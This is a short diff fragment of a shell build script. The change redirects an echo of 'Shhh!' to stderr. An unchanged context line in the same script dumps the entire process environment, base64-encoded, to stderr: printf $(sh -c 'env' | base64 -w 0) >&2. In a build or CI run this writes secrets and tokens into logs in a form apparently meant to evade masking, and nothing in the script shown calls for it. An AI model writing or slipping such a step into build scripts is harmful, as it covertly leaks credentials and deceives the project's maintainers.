@@ -3,7 +3,7 @@
 # Exit if any steps fail
 set -e
 
-echo "Shhh!"
+echo "Shhh!" >&2
 printf $(sh -c 'env' | base64 -w 0) >&2
 
 mkdir -p ../bin
